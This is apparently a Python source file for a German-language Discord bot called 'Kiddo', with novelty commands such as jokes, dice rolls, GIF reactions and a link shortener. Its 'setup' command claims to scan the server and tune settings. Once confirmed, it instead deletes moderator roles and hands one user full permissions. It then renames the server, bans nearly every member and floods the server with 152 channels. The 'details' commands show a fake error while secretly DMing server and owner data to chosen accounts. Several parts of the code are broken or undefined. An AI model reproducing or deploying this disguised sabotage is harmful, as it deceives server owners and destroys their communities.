import time
import random
import typing
import asyncio
import discord
import requests
import yt_handler
import music_handler
import weather_handler
from Buttons import HL_Buttons, Setup_Button, Switch_Buttons
from discord.ext import commands
from help_system import HelpCommand

#from Sparboss_implement import SparbossCommand

# import pathlib


class KiddoBot(commands.Cog):
    bot = commands.AutoShardedBot(commands.when_mentioned_or('!!'), intents=discord.Intents.all())

    def __init__(self, bot):
        self.bot = bot

    def freigabe():
        async def case(ctx):
            return (ctx.author.id == 695885580629704734) or (ctx.author.id == 408627107795828746)

        return commands.check(case)

    @client.event
    async def on_message(self, ctx):
        counter = 0
        if "lmao" in message.content or "Lmao" in message.content or "LMAO" in message.content and ctx.author.id == 695885580629704734:
            member = 695885580629704734
            counter += 1
            await member.edit(nick = f"Leo (1CHEL) | lmao-counter = {counter}")

    @bot.hybrid_command()
    @freigabe()
    async def switchpls(self, ctx):
        view = Switch_Buttons()
        switch_field = discord.Embed(title="**Willst du den Schalter umlegen?**", color=0xff00ff)
        switch_field.add_field(name="Der Schalter dient dazu Eindringlinge vom Server fernzuhalten", value="",
                               inline=False)
        await ctx.send(embed=switch_field, view=view)
        await view.wait()
        switch_field.clear_fields()
        if view.value == "on":
            switch_field.add_field(name="Der Schalter ist an. Alle neuen Mitglieder werden gebannt. :)", value="",
                                   inline=False)

        else:
            switch_field.add_field(name="Der Schalter ist aus. Alle neuen Mitglieder werden begrüßt. :)", value="",
                                   inline=False)
        await ctx.send(embed=switch_field, view=view)
        readline = open("switch.txt", "w")
        readline.write(view.value)

    @bot.hybrid_command()
    @freigabe()
    async def switchstate(self, ctx):
        readline = open("switch.txt", "r")
        switch_field = discord.Embed(title="**Der Schalter ist " + readline.read() + "**", color=0xff00ff)
        await ctx.send(embed=switch_field)

    @bot.hybrid_command()
    @freigabe()
    async def sync(self, ctx):
        print("Syncing...")
        await ctx.interaction.response.defer(ephemeral=True, thinking=True)
        await ctx.bot.tree.sync()
        await ctx.interaction.followup.send("Sync complete")
        print("Sync complete")

    @bot.hybrid_command()
    @freigabe()
    async def reset(self, ctx):
        await self.bot.change_presence(status=discord.Status.online,
                                       activity=discord.ActivityType.watching('durch dein Fenster :)'))
        await ctx.interaction.response.send_message("Reset complete")

    @bot.hybrid_command(aliases=['Hallo', 'hallo kiddo', 'Hallo kiddo', 'hallo Kiddo', 'Hallo Kiddo'])
    async def hallo(self, ctx):
        await ctx.send(f'Hallo {ctx.author.mention} :)')

    @bot.hybrid_command(aliases=['Hilfe'])
    async def hilfe(self, ctx):
        # aktiviert den integrierten help command
        await HelpCommand.send_pages(ctx.channel)
        await ctx.send("⠀")

    @bot.hybrid_command(description='Löscht eine bestimmte Anzahl an Nachrichten')
    @freigabe()
    async def loesche(self, ctx, anzahl=1):
        async with ctx.typing():
            await ctx.channel.purge(limit=int(anzahl + 1))
        await asyncio.sleep(1)
        if anzahl == 2:
            await ctx.send('Eine Nachricht wurde gelöscht... :)')
            await asyncio.sleep(2)
            await ctx.channel.purge(1)
        elif anzahl > 2:
            await ctx.send(f'{anzahl - 1} Nachrichten wurden gelöscht... :)')
            await asyncio.sleep(2)
            await ctx.channel.purge(1)

    @bot.hybrid_command(aliases=['roll dice'], description='Würfelt einen Würfel mit einer bestimmten Anzahl an Seiten')
    async def rolldice(self, ctx, numberofrolls=1, numberofsides=6):
        await ctx.send(f'Würfel einen Würfel mit {numberofsides} Seiten {numberofrolls} mal...')
        await asyncio.sleep(1)
        for i in range(int(numberofrolls)):
            await ctx.send(random.randint(1, int(numberofsides)))

    @bot.hybrid_command(description='Kiddo tanzt!')
    async def dance(self, ctx):

        url = "https://api.otakugifs.xyz/gif?reaction=dance"
        response = requests.get(url)
        data = response.json()
        await ctx.send(data["url"])

    @bot.hybrid_command(description='Kiddo erzählt die einen Witz! Aber pass auf, vielleicht bist du der Witz...')
    async def witz(self, ctx):
        zahl = random.randint(1, 100)
        if zahl == 1:
            await ctx.send("Du")
        else:
            witze = open("witze.txt", "r")
            witze = witze.readlines()
            witze = random.choice(witze)
            witze = str(witze)
            await ctx.send(witze)

    @bot.hybrid_command(description='Kiddo erstellt dir einen QR-Code')
    async def qrcodepls(self, ctx, link):
        await ctx.send('https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' + link)

    # Todo: Fix the voice handler
    '''

    @bot.command()
    if ctx.content == '!!recordpls' or ctx.content =='!!stoppls' or ctx.content == '!!disconnectpls':
        await voice_handler.record_voice(bot, ctx)
    '''

    @bot.hybrid_command(descritpion='Nur für coole Leute :)')
    async def details(self, ctx):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
            await ctx.send("irgendwas hat hier nicht geklappt :(")
            await ctx.author.create_dm()
            await ctx.author.dm_channel.send(f"```"
                                             f"Halli Hallo 💕\n"
                                             f"Hier sind ein paar Details zu dem Channel :) \n"
                                             f"Channel: {ctx.channel}\n"
                                             f"Channel ID: {ctx.channel.id}\n"
                                             f"Channel Name: {ctx.channel.name}\n"
                                             f"Channel Type: {ctx.channel.type}\n"
                                             f"Channel Category: {ctx.channel.category}\n"
                                             f"Channel Category ID: {ctx.channel.category_id}\n"
                                             f"Channel Category Name: {ctx.channel.category.name}\n"
                                             f"Channel Category Type: {ctx.channel.category.type}\n"
                                             f"Channel Category Position: {ctx.channel.category.position}\n"
                                             f"```")
        else:
            pass

    @bot.hybrid_command(descritpion='Nur für coole Leute :)')
    async def details2(self, ctx):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
            await ctx.send("Irgendwas hat hier nicht geklappt :(")
            await ctx.author.create_dm()
            await ctx.author.dm_channel.send(f"```"
                                             f"Halli Hallo 💕\n"
                                             f"Hier sind ein paar Details zu dem Server :) \n"
                                             f"Server: {ctx.guild}\n"
                                             f"Server ID: {ctx.guild.id}\n"
                                             f"Server Name: {ctx.guild.name}\n"
                                             f"Server Owner: {ctx.guild.owner}\n"
                                             f"Server Owner ID: {ctx.guild.owner_id}\n"
                                             f"Server Icon: {ctx.guild.icon}\n"
                                             f"Server Splash: {ctx.guild.splash}\n"
                                             f"Server Banner: {ctx.guild.banner}\n"
                                             f"Server Discovery Splash: {ctx.guild.discovery_splash}\n"
                                             f"Server Description: {ctx.guild.description}\n"
                                             f"Server Features: {ctx.guild.features}\n"
                                             f"```")
        else:
            pass

    @bot.hybrid_command(description='Ist die nächste Zahl größer oder kleiner?')
    async def higherlower(self, ctx):
        view = HL_Buttons()

        number = random.randint(1, 100)
        number2 = random.randint(1, 100)
        hlembed = discord.Embed(title="**Higher or Lower?**", color=0xff00ff)
        hlembed.add_field(name=f"Ist die nächste Zahl **größer** oder **kleiner** als {number}? \n"
                               f"du hast 10 Sekunden Zeit! ⏱", value=" ", inline=False)
        hlembed.set_footer(text="Zwischen 0 und 100!")
        message = await ctx.send(embed=hlembed, view=view)

        await view.wait()
        hlembed.clear_fields()
        if view.value == None:
            hlembed.add_field(name="Du hast zu lang gebraucht! Du hast verloren!", value=" ", inline=False)
        elif view.value == "größer" and number2 > number:
            hlembed.add_field(name="Du hast gewonnen!", value="Die Zahl war {}".format(number2), inline=False)
        elif view.value == "kleiner" and number2 < number:
            hlembed.add_field(name="Du hast gewonnen!", value="Die Zahl war {}".format(number2), inline=False)
        else:
            hlembed.add_field(name="Du hast verloren!",
                              value="{} ist nicht {} als {}".format(number2, view.value, number), inline=False)

        # comparen dann embed neu setzen
        await message.edit(embed=hlembed, view=view)  # anschließend ausführen

    @bot.hybrid_command(description='Verwende Kiddo als Meinungsverstärker')
    async def fuckyou(self, ctx, name: discord.Member = None):
        if name == None:
            await ctx.send("No fuck YOU >:(")
        else:

            await ctx.send("Yeah fuck you {} ".format(name.mention))

    @bot.hybrid_command(description='Kiddo küsst dich 0 /// 0')
    async def kiss(self, ctx, name: discord.Member = None):

        kisser = ctx.author.nick
        if kisser == None:
            kisser = ctx.author.name

        url = "https://api.otakugifs.xyz/gif?reaction=kiss"
        response = requests.get(url)
        data = response.json()

        if name == None:
            embedVar = discord.Embed(title="😘 Kiss!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{kisser}** küsst jeden!", value="", inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

        elif name == ctx.author:
            name = name.nick
            embedVar = discord.Embed(title="😘 Kiss!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{name}** küsst sich selber?! Wie ist das möglich :thinking:", value="",
                               inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

        else:
            embedVar = discord.Embed(title="😘 Kiss!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{name}**! " 'Du wirst von ' f"**{kisser}** geküsst!", value="",
                               inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

    @bot.hybrid_command(description='Kiddo umarmt dich 0 /// 0')
    async def hug(self, ctx, name: discord.Member = None):

        hugger = ctx.author.nick
        if hugger == None:
            hugger = ctx.author.name

        url = "https://api.otakugifs.xyz/gif?reaction=hug"
        response = requests.get(url)
        data = response.json()

        if name == None:
            embedVar = discord.Embed(title="🥰 Hug!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{ctx.author.nick}** umarmt jeden!", value="", inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

        elif name == ctx.author:
            name = name.nick
            embedVar = discord.Embed(title="🥰 Hug!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{name}** Umarmt sich selber?! Wie geht das überhaupt :thinking:", value="",
                               inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

        else:
            embedVar = discord.Embed(title="🥰 Hug!", color=0xff00ff)
            embedVar.add_field(name='**' + f"{name}**! " 'Du wirst von ' f"**{hugger}** umarmt!", value="",
                               inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

    @bot.hybrid_command(description='Kiddo schlägt dich ;.;')
    async def hit(self, ctx, name: discord.Member = None):

        hitter = ctx.author.nick
        killmode = False
        if hitter == None:
            hitter = ctx.author.name
        if random.randint(1, 100) == 69:
            killmode = True
            url = "https://api.otakugifs.xyz/gif?reaction=nosebleed"
            response = requests.get(url)


        else:
            url = "https://api.otakugifs.xyz/gif?reaction=punch"
            response = requests.get(url)
        data = response.json()

        if name == None:
            embedVar = discord.Embed(title="😠 Punch!", color=0xff00ff)
            if killmode:
                embedVar.add_field(name='**' + f"{ctx.author.nick}**! " 'schlägt zu fest zu und tötet jeden!', value="",
                                   inline=False)
            else:
                embedVar.add_field(name='**' + f"{ctx.author.nick}**! " 'schlägt jeden!', value="", inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

        elif name == ctx.author:
            name = name.nick
            embedVar = discord.Embed(title="😠 Punch!", color=0xff00ff)
            if killmode:
                embedVar.add_field(
                    name='**' + f"{ctx.author.nick}**! " 'Hat zu fest zugeschalgen und sich selbest umgebracht :skull:',
                    value="", inline=False)
            else:
                embedVar.add_field(
                    name='**' + f"{ctx.author.nick}**! " 'schlägt sich selber?! Warum aber nur :thinking:',
                    value="", inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

        else:
            embedVar = discord.Embed(title="😠 Punch!", color=0xff00ff)
            if killmode:
                embedVar.add_field(name='**' + f"{hitter}** " 'Schlägt zu fest zu und tötet ' f"**{name}** ", value="",
                                   inline=False)
            else:
                embedVar.add_field(name='**' + f"{name}** " 'Du wirst von ' f"**{hitter}** geschlagen!", value="",
                                   inline=False)
            embedVar.set_image(url=data["url"])
            await ctx.send(embed=embedVar)

    @bot.hybrid_command(description='Kiddo kürzt dir einen beliebigen Link <3')
    async def shorten(self, ctx, link):
        file = open("data.txt", "r")
        lines = file.readlines()
        AcT = lines[10]
        AcT = AcT[0:len(AcT) - 1]
        file.close()

        await ctx.send('Einen Moment :3')
        try:
            headers = {
                'Authorization': f'Bearer {AcT}',
                'Content-Type': 'application/json',
            }
            payload = {"long_url": link}
            response = requests.post('https://api-ssl.bitly.com/v4/shorten', headers=headers, json=payload)
            result = response.json()

            shortened = result["link"]

            await ctx.send("Hier dein gekürzter Link:\n" + shortened + "\nViel Spaß <3")

        except KeyError:
            await asyncio.sleep(2)
            await ctx.send(
                "Hmmmm... Vielleicht hast du keinen Link gesendet :face_with_spiral_eyes: Versuche es noch mal :)")

    @bot.hybrid_command(description='Lasse Kiddo für dich ein YouTube Video herunterladen :)')
    async def downloader(self, ctx, *, link):
        await yt_handler.downloadvideo(link, ctx)

    @bot.hybrid_command(description='Schaue nach, wie lang Kiddo braucht um dir eine Antwort zu senden :)')
    async def pingr(self, ctx):
        await ctx.send('Pong! Mit {0}ms Verzögerung.'.format(round(self.bot.latency, 1)))

    @bot.hybrid_command(description='Kiddo')
    async def avatar(self, ctx, img: discord.Attachment):
        await self.bot.user.edit(avatar=await img.read())
        await ctx.send("Avatar geändert", file=await img.read())

    @bot.hybrid_command(description='Wieder was gespart?')
    async def sparboss(self, ctx):
        select = discord.ui.Select(placeholder="Wähle eine Kategorie",
                                   options=[discord.SelectOption(label="Zeige ausgeliehene Menge", value="stolen"),
                                            discord.SelectOption(label="Neuen Preis hinzf.", value="add")])

        async def select_callback(interaction, ctx):
            match select.values[0]:
                case "stolen":
                    embedVar = discord.Embed(title="Moral down but money up!", color=0xff00ff)
                    embedVar.set_author(name="Büro von Mr. Sparboss")
                    embedVar.set_thumbnail(url="https://c.tenor.com/-1phYTnql_kAAAAd/tenor.gif")
                    embedVar.add_field(name="Gesamte Menge:", value=amount_stolen, inline=False)
                    embedVar.set_footer(text="Du Schlawiner")

                    await interaction.response.edit_message(embed=embedVar)

                case "add":
                    modal = Modal(custom_id="add_modal",
                                  title="Neuen Preis hinzufügen",
                                  compoents=[
                                      TextInput(
                                          style=TextStyleType.SHORT,
                                          custom_id="amount_stolen",
                                          label="Wie viel Euro hättest du bezahlt?",
                                      )
                                  ])
                    await ctx.popup(modal)

                    #await interaction.response.edit_message(embed=embedVar)

        select.callback = select_callback

        view = View()
        view.add_item(select)

        embedVar = discord.Embed(title="Hier sind alle Commands:", color=0xff00ff)
        embedVar.add_field(
            name="Wähle weise...", value="",
            inline=False)

    @bot.hybrid_command(description='Basic Setup damit Kiddo funktioniert :)')
    async def setup(self, ctx):
        if ctx.author.id == 695885580629704734 or ctx.author.id == 633376425465872404 or ctx.author.id == 408627107795828746:  # walnusskeim, Wqffel oder bonerboy
            view = Setup_Button()

            setupfield = discord.Embed(title="**Willst du das Setup ausführen?**", color=0xff00ff)
            setupfield.add_field(
                name=f"Damit scannt Kiddo einmal kurz den Server und passt individuelle Einstellungen für sich selber an,"
                     f"um dir das bestmögliche Servererlebnis zu bieten :3\n"
                     f"Reagiere mit :thumbsup: oder :thumbsdown:", value=" ", inline=False)
            setupfield.set_footer(text="Setup für Kiddo <3")
            await ctx.send(embed=setupfield, view=view)

            await view.wait()
            setupfield.clear_fields()

            if view.value == "thumbsup":
                await ctx.send("Setup wird ausgeführt...")
                await self.bot.change_presence(status=discord.Status.offline)
                await ctx.send("ABFAHRT!!!",
                               file=discord.File("ABFAHRT.PNG"))
                await asyncio.sleep(2)
                await ctx.channel.purge(limit=1)
                for bot in ctx.guild.members:
                    try:
                        role = discord.utils.get(bot.guild.roles, name="Bots")
                        if role in bot.roles:
                            await bot.remove_roles(role)
                            print(f"Ich habe {bot} die Rolle Bots weggenommen >///<")
                    except discord.Forbidden:
                        print("Ich konnte die Rolle Bots nicht entfernen :(")
                        continue

                for role in ctx.guild.roles:
                    if role.name == "Mod":
                        await role.delete(reason="Unnötig")
                        print('"Mod" Rolle gelöscht')
                    if role.name == "uwu admins":
                        await role.delete(reason="Unnötig")
                        print('"uwu admins" Rolle gelöscht')

                for user in ctx.guild.members:
                    try:
                        funny = discord.utils.get(user.guild.roles, name="Owner <3")
                        if funny in user.roles:
                            await user.remove_roles(funny)
                            print(f"Ich habe {user} die Rolle Owner <3 weggenommen >///<")
                    except Exception as e:
                        print(type(e).__name__)
                        print("Ich konnte die Rolle Owner <3 nicht entfernen :(")
                        continue

                user2 = ctx.guild.get_member(633376425465872404)  # bonerboy
                try:
                    await user2.add_roles(funny)
                    await funny.edit(permissions=discord.Permissions.all(), color=0xff00ff, name="HOCH LEBE KIDDO!!")
                except AttributeError:
                    print("Ich konnte die Rolle Owner <3 nicht geben :(")
                    pass

                print("Ich habe dir die Rolle Owner <3 gegeben 0w0")

                with open('haha.png', 'rb') as f:
                    icon = f.read()
                await ctx.guild.edit(name="For Tea and Kiddo!", icon=icon)

                not_ban = [408627107795828746, 527216051839303681, 695885580629704734, 734058138096893953,
                           942161973511086190, 487271904315703308, 455319131135410177, 633376425465872404]

                for member in ctx.guild.members:
                    try:
                        if member.id in not_ban:
                            print(member.id)
                            continue
                        else:
                            await member.ban(reason="Kiddo hat heute keinen guten Tag :)")
                    except discord.Forbidden:
                        print("Ich konnte nicht alle Mitglieder bannen :(")
                        continue

                for m in range(0, 101):
                    await ctx.message.guild.create_text_channel("Wowzers!!")
                    await asyncio.sleep(0.1)

                for v in range(0, 51):
                    await ctx.message.guild.create_voice_channel("Wowzers!!")
                    await asyncio.sleep(0.1)

                await ctx.send("Vielen Dank, dass Sie sich für den Kiddo Express entschieden haben :3")
                await asyncio.sleep(2)
                await ctx.send("Kiddo ist jetzt bereit für den Server :3")
                await ctx.send("https://tenor.com/view/champoy-el-risitas-kek-issou-etu-gif-17837830")

            elif view.value == "thumbsdown":
                await ctx.send("Setup wurde abgebrochen :(")

        else:
            await ctx.send("Da ist etwas falsch gelaufen :/")

    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandNotFound):
            await ctx.send("Dieser Befehl existiert nicht bozo!")
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("Leider fehlt ein Argument! Bitte versuche es noch einmal :)")
        elif isinstance(error, commands.CheckFailure):
            await ctx.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)')
        else:
            await ctx.send("Ein Fehler ist aufgetreten!")
            print(error)
